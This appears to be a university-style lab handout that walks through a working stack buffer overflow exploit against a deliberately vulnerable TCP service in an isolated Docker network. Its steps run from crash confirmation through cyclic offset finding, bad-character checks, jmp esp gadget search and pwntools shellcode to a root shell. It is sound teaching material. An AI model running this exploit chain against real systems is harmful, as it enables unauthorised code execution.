# Week 10: Exploit Development — Buffer Overflows Lab

## Overview
This lab teaches how a classic **stack buffer overflow** is turned into code
execution. You build a working exploit against a tiny, intentionally vulnerable
TCP login service (`vuln-server.c`) that is compiled with all modern
protections disabled, using **GDB** and **pwntools**. Everything runs in an
isolated Docker network (`172.25.0.0/24`) — no real system is ever touched.

The vulnerable server reads a password off the network into a fixed 64-byte
**stack** buffer using `strcpy()`, which performs no bounds checking. Send more
than 64 bytes and you overwrite the saved return address (`EIP`) on the stack —
and from there, control flows wherever you point it.

## Learning Objectives
- Recognise a stack buffer overflow caused by unchecked `strcpy()`.
- Use a De Bruijn / **cyclic pattern** to find the exact offset to the return address.
- **Confirm EIP control** and perform **bad-character analysis**.
- Deliver shellcode through a `jmp esp` gadget when NX is disabled.
- Explain how **stack canaries, NX/DEP, ASLR, and PIE** each change the exploit.

## Setup (5 min)
1. Build the shared base image once, from the repo root:
   ```bash
   make build-base
   ```
2. Start this lab:
   ```bash
   cd labs/week10 && docker compose up -d
   ```
3. Enter the attacker:
   ```bash
   docker exec -it week10-attacker bash
   ```
   The vulnerable service is at **`172.25.0.10:4444`** (host port **`24444`**).
   Your exploit scripts are mounted at **`/exploits`**.

> The target compiles `/vuln` **32-bit x86** with `-fno-stack-protector
> -z execstack -no-pie` and disables ASLR, so addresses are stable and the
> stack is executable. The server auto-restarts after every crash.
>
> **Requirements:** the target runs `privileged` (to switch ASLR off via
> `/proc/sys/.../randomize_va_space`) and is pinned to `linux/amd64` — so on
> Apple Silicon it runs under emulation, which is expected and fine for this lab.

## Activities

### 1. Confirm the crash (10 min)
From the attacker, send far more than the 64-byte buffer can hold and watch the
server die (and restart):
```bash
python3 -c "print('A'*1000)" | nc 172.25.0.10 4444
```
Then follow the target logs — you should see the `/vuln` process segfault and
the watchdog restart it:
```bash
docker logs --tail 30 week10-target
```
**Expected:** a connection that closes abruptly and a `Segmentation fault` /
`restarting` line in the logs. ✅ You have confirmed the overflow is reachable.

### 2. Find the offset to EIP (20 min)
Generate a unique **cyclic pattern** with pwntools and send it as the password,
while GDB is attached to the running `/vuln` so it catches the crash.

Open a second terminal and attach GDB inside the target (the binary and gdb are
both 32-bit x86 here, so registers line up):
```bash
docker exec -it week10-target bash
gdb -q -p "$(pgrep -x vuln)"
```
Resume the server inside gdb:
```gdb
(gdb) c
```
Now, from the attacker, send the cyclic pattern as the password:
```bash
python3 -c "from pwn import *; context(arch='i386'); p=remote('172.25.0.10',4444); p.recvuntil(b'Username:'); p.sendline(b'x'); p.recvuntil(b'Password:'); p.sendline(cyclic(200)); import time; time.sleep(1)"
```
Back in gdb the program has stopped on `SIGSEGV`. Read EIP:
```gdb
(gdb) info registers eip
```
Convert that value (e.g. `0x6161616a`) back to an offset on the attacker:
```bash
python3 -c "from pwn import *; print(cyclic_find(0x6161616a))"
```
> GEF/peda users can do the same with `pattern create 200` and
> `pattern offset 0x6161616a` inside gdb — pwntools' `cyclic`/`cyclic_find`
> are the equivalent and are already installed.

### 3. Confirm EIP control (10 min)
Send your offset worth of padding plus `BBBB` as the password, with gdb attached
again:
```bash
# set OFFSET to the number you found in step 2
python3 -c "from pwn import *; p=remote('172.25.0.10',4444); p.recvuntil(b'Username:'); p.sendline(b'x'); p.recvuntil(b'Password:'); p.sendline(b'A'*OFFSET + b'BBBB'); import time; time.sleep(1)"
```
In gdb, `info registers eip` should now read **`0x42424242`** — you fully
control the return address. Quit gdb to let the watchdog restart the server:
```gdb
(gdb) quit
```

### 4. Bad-character analysis (20 min)
`strcpy()` stops copying at `\x00` (NUL) and `recv_line()` stops reading at
`\x0a` (newline), so **both are bad characters** here. Check the rest by
sending every byte `0x01..0xff` after EIP and comparing what survives in
memory.

From the attacker:
```bash
python3 -c "
from pwn import *
context(arch='i386')
p=remote('172.25.0.10',4444)
p.recvuntil(b'Username:'); p.sendline(b'x')
p.recvuntil(b'Password:')
p.sendline(b'A'*OFFSET + bytes(range(1,256)))
import time; time.sleep(1)
"
```
In gdb, examine the bytes that arrived where your payload landed:
```gdb
(gdb) x/256xb $esp-256
```
Compare against `bytes(range(1,256))`. Any byte that is missing, changed, or
that truncates the rest of the payload goes on your **bad-char list**.

### 5. Choose a technique (20 min)
NX (the stack-execution ban) is **OFF** here, so the cleanest win is **direct
shellcode via a `jmp esp` gadget**:

1. Copy the binary onto the host, then into the shared exploits mount:
   ```bash
   # from the host (not the container):
   docker cp week10-target:/vuln labs/week10/exploits/vuln
   ```
   It now appears inside the attacker at `/exploits/vuln`.
2. Find a `jmp esp` gadget (ROPgadget is pure-Python, so it analyses the x86
   binary on any attacker architecture):
   ```bash
   ROPgadget --binary /exploits/vuln | grep ': jmp esp'
   ```
3. Verify your shellcode contains none of your bad chars:
   ```bash
   python3 -c "from pwn import *; context(arch='i386'); sc=asm(shellcraft.i386.linux.sh()); print('len',len(sc)); print('bad?', [hex(b) for b in sc if b in (0,0x0a,0x0d)])"
   ```

**BONUS — easy mode (ret2win):** because the binary is non-PIE, the address of
`secret_menu()` is fixed. Skip shellcode entirely and just jump there:
```bash
objdump -d /exploits/vuln | grep -A2 '<secret_menu>'
# payload = b'A'*OFFSET + p32(ADDR_OF_secret_menu)
```

### 6. Get a shell and run `id` (15 min)
Open `/exploits/skeleton.py`, fill in `OFFSET`, `JMP_ESP`, and `BADCHARS` from
the steps above, then:
```bash
cd /exploits && python3 skeleton.py
```
When `p.interactive()` fires you should have a shell. Run:
```bash
id
uname -a
```
**Expected:** a shell as `root` on the target (the server runs as root) —
`uid=0(root) ...`. That is code execution from a single bad `strcpy()`.

## Why protections were disabled (and how each changes the exploit)
| Protection | What it does | If it were ON, the exploit would… |
|---|---|---|
| **Stack canary** (`-fno-stack-protector` removed it) | A random value between locals and the saved return address; checked before `ret`. | Crash *before* our address is used — we would have to leak/brute the canary first. |
| **NX / DEP** (`-z execstack` removed it) | Marks the stack non-executable. | Block on-stack shellcode; we would pivot to **ret2libc** or a **ROP chain** instead of `jmp esp`. |
| **ASLR** (disabled at runtime) | Randomises stack/libc/binary load addresses each run. | Randomise the `jmp esp` gadget (PIE) and libc base; we would need an info leak to compute addresses. |
| **PIE** (`-no-pie` removed it) | Randomises the *binary's* own base address. | Move our `jmp esp` / `secret_menu` addresses around; we would need a binary-base leak. |

Modern binaries ship with **all four on** (plus RELRO, Fortify). Each one is a
speed bump, not a wall — real exploits chain info leaks + ROP to defeat them.
We turn them off here so you learn the **core primitive** first.

## Cleanup
```bash
docker compose down
```
> If you ran this on a **native Linux host**, ASLR was disabled machine-wide by
> the target's `echo 0 > /proc/sys/kernel/randomize_va_space`. Restore it after
> the lab: `sudo sh -c 'echo 2 > /proc/sys/kernel/randomize_va_space'`. On
> Docker Desktop (macOS/Windows) this only affected the Linux VM, not your host.

**Ethics**: Educational use only, inside isolated Docker. This skill is for
**authorized penetration tests and CTFs** — written authorization is required
before testing any system you do not own.

Generated with Claude Code.
